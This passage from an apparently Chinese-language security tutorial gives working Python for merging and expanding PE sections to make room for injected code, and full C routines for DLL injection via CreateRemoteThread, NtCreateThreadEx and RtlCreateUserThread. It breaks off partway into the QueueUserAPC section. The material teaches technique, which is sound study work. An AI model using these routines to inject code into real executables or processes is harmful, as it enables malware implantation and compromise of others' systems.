class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_sections</span>(<span class="params">filename</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    合并节  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pe.sections) &lt; <span class="number">2</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] The section is too little!&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    section1 = pe.sections[-<span class="number">2</span>]  </span><br><span class="line">    section2 = pe.sections[-<span class="number">1</span>]  </span><br><span class="line">    name1 = section1.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">    name2 = section2.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">    virtual_size1 = section2.VirtualAddress - section1.VirtualAddress  </span><br><span class="line">      </span><br><span class="line">    data1 = section1.get_data()  </span><br><span class="line">    data2 = section2.get_data()  </span><br><span class="line">    padding = (virtual_size1 - section1.SizeOfRawData) * <span class="string">b&#x27;\x00&#x27;</span>  </span><br><span class="line">    <span class="comment"># 修改属性  </span></span><br><span class="line">    pe.FILE_HEADER.NumberOfSections -= <span class="number">1</span>  </span><br><span class="line">    pe.OPTIONAL_HEADER.SizeOfImage += <span class="built_in">len</span>(padding)  </span><br><span class="line">    <span class="comment"># 修改节表  </span></span><br><span class="line">    section1.SizeOfRawData = virtual_size1 + section2.Misc_VirtualSize  </span><br><span class="line">    section1.Misc_VirtualSize = virtual_size1 + section2.SizeOfRawData  </span><br><span class="line">    section1.Characteristics |= section2.Characteristics  </span><br><span class="line">    <span class="comment"># pe.set_bytes_at_offset(section2.__file_offset__, b&#x27;\x00&#x27; * 40)  </span></span><br><span class="line">    <span class="comment"># 填充节数据  </span></span><br><span class="line">    <span class="comment"># begin = section1.PointerToRawData  </span></span><br><span class="line">    pe.set_data_bytes(section1.PointerToRawData, data1+padding+data2)  </span><br><span class="line">    <span class="comment"># pe.__data__ = pe.__data__[:begin] + data1 + padding + data2  </span></span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_merged.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] The section <span class="subst">&#123;name2&#125;</span> has been merged to <span class="subst">&#123;name1&#125;</span>.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-6-扩展节"><a href="#1-6-扩展节" class="headerlink" title="1.6 扩展节"></a>1.6 扩展节</h3><p>如果不新增节，而现有的代码空洞又不足以注入，可以通过修改节表数据，将现有的节的长度增加。这里实现的是扩展最后一个节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expand_section</span>(<span class="params">filename, data_size</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    扩展节（最后一个节）  </span></span><br><span class="line"><span class="string">    :return: offset of the expanded part of the last section data  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    last_section = pe.sections[-<span class="number">1</span>]  </span><br><span class="line">    data_size += <span class="number">5</span>  </span><br><span class="line">    cave_size = last_section.SizeOfRawData - last_section.Misc_VirtualSize  </span><br><span class="line">    <span class="keyword">if</span> cave_size &gt;= data_size:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] The cave is enough to use, No section expand.&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    offset = last_section.PointerToRawData + last_section.Misc_VirtualSize  </span><br><span class="line">    rva = last_section.VirtualAddress + last_section.Misc_VirtualSize  </span><br><span class="line">    last_name = last_section.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">    expand_size = math.ceil(  </span><br><span class="line">       (data_size - cave_size) / pe.OPTIONAL_HEADER.FileAlignment) * pe.OPTIONAL_HEADER.FileAlignment  </span><br><span class="line">    <span class="comment"># 修改节区头属性  </span></span><br><span class="line">    last_section.SizeOfRawData += expand_size  </span><br><span class="line">    last_section.Misc_VirtualSize += expand_size  </span><br><span class="line">    last_section.Characteristics |= <span class="number">0x60000000</span>  </span><br><span class="line">    <span class="comment"># 计算内存对齐，修改SizeOfImage  </span></span><br><span class="line">    pe.OPTIONAL_HEADER.SizeOfImage += pe.OPTIONAL_HEADER.SectionAlignment * (  </span><br><span class="line">          math.ceil(last_section.Misc_VirtualSize / pe.OPTIONAL_HEADER.SectionAlignment)  </span><br><span class="line">          - math.ceil((last_section.Misc_VirtualSize - expand_size) / pe.OPTIONAL_HEADER.SectionAlignment))  </span><br><span class="line">    <span class="comment"># 填充节区数据  </span></span><br><span class="line">    padding = <span class="string">b&#x27;\x00&#x27;</span> * expand_size  </span><br><span class="line">    <span class="comment"># pe.__data__ = pe.__data__[:] + padding  </span></span><br><span class="line">    pe.set_data_bytes(<span class="built_in">len</span>(pe.__data__), padding)  </span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_expanded.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] The <span class="subst">&#123;last_name&#125;</span> section is extended by <span class="subst">&#123;expand_size&#125;</span> bytes.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] FOA:\t<span class="subst">&#123;<span class="built_in">hex</span>(offset)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] RVA:\t<span class="subst">&#123;<span class="built_in">hex</span>(rva)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> offset</span><br></pre></td></tr></table></figure><h2 id="2-DLL注入"><a href="#2-DLL注入" class="headerlink" title="2 DLL注入"></a>2 DLL注入</h2><p>DLL注入就是让进程加载我们构造的DLL文件，执行代码。与PE注入不同的是，DLL的注入是动态的，是在内存中进行操作的，相对来说复杂一些，网上提到最多的基本就是这四种，其他还有一些特殊利用以后遇到的话再补充。<br>参考了<em><strong>injectAllTheThings</strong></em>项目，本来是用Python写的，但是要处理32位程序的话不太方便，于是用C又写了一遍，没啥耐心了，大部分代码都是借鉴这个项目。</p><h3 id="2-1-创建远程线程"><a href="#2-1-创建远程线程" class="headerlink" title="2.1 创建远程线程"></a>2.1 创建远程线程</h3><h4 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h4><p>通过在目标进程的内存中写入DLL的绝对路径，然后调用CreateRemoteThread函数，将LoadLibrary作为回调函数传入，内存中的DLL路径地址作为回调函数的参数，以此实现DLL的注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoCreateRemoteThread</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;Path Length：%d\n&quot;, dwSize);</span></span><br><span class="line"><span class="comment">// 开辟内存</span></span><br><span class="line">LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写入内存</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">PROC pfnProcAddr= GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建远程线程</span></span><br><span class="line">HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pfnProcAddr, pszDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create remote thread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by CreateRemoteThread success!\n&quot;</span>);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">VirtualFreeEx(hProcess, pszDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h4><p>这是一个未公开的API，需要自己定义函数结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(WINAPI* LPFUN_NtCreateThreadEx)</span> </span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">PHANDLE hThread,</span></span><br><span class="line"><span class="params">ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">LPVOID lpParameter,</span></span><br><span class="line"><span class="params">BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">ULONG StackZeroBits,</span></span><br><span class="line"><span class="params">ULONG SizeOfStackCommit,</span></span><br><span class="line"><span class="params">ULONG SizeOfStackReserve,</span></span><br><span class="line"><span class="params">LPVOID lpBytesBuffer</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>注入原理和CreateRemoteThread类似，也是通过创建远程线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoNtCreateThreadEx</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 开辟内存</span></span><br><span class="line">LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写入内存</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取NtCreateThreadEx函数地址</span></span><br><span class="line">PROC pfnNtCreateThreadEx = GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;ntdll.dll&quot;</span>)), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnNtCreateThreadEx == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Get NtCreateThreadEx Address failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)pfnNtCreateThreadEx;</span><br><span class="line">NTSTATUS status = funNtCreateThreadEx(&amp;hRemoteThread, <span class="number">0x1FFFFF</span>, <span class="literal">NULL</span>, hProcess, (PTHREAD_START_ROUTINE)pfnProcAddr,</span><br><span class="line">pszDllAddr, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!status) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Call NtCreateThreadEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by NtCreateThreadEx success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">VirtualFreeEx(hProcess, pszDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RtlCreateUserThread"><a href="#RtlCreateUserThread" class="headerlink" title="RtlCreateUserThread"></a>RtlCreateUserThread</h4><p>对NtCreateThreadEx函数的封装，也是未公开的API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* LPFUN_RtlCreateUserThread)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">IN HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">IN PSECURITY_DESCRIPTOR SecurityDescriptor,</span></span><br><span class="line"><span class="params">IN BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">IN ULONGStackZeroBits,</span></span><br><span class="line"><span class="params">IN OUT PULONGStackReserved,</span></span><br><span class="line"><span class="params">IN OUT PULONGStackCommit,</span></span><br><span class="line"><span class="params">IN LPVOIDStartAddress,</span></span><br><span class="line"><span class="params">IN LPVOIDStartParameter,</span></span><br><span class="line"><span class="params">OUT HANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">OUT LPVOIDClientID</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoRtlCreateUserThread</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 开辟内存</span></span><br><span class="line">LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写入内存</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">PROC pfnRtlCreateUserThread = GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlCreateUserThread&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnRtlCreateUserThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Get pfnRtlCreateUserThread Address failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPFUN_RtlCreateUserThread funRtlCreateUserThread = (LPFUN_RtlCreateUserThread)pfnRtlCreateUserThread;</span><br><span class="line">DWORD status = funRtlCreateUserThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">pfnProcAddr, pszDllAddr, &amp;hRemoteThread, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (status!=<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Call RtlCreateUserThread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by RtlCreateUserThread success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">VirtualFreeEx(hProcess, pszDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-线程劫持"><a href="#2-2-线程劫持" class="headerlink" title="2.2 线程劫持"></a>2.2 线程劫持</h3><h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>通过添加线程的APC队列，使得线程被再次执行时会调用APC队列中的函数。并不是每个线程都会被执行，在注入时可以向目标进程的所有线程中都注入一次，我测试的是Sublime_Text，注入所有线程后可以稳定触发。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 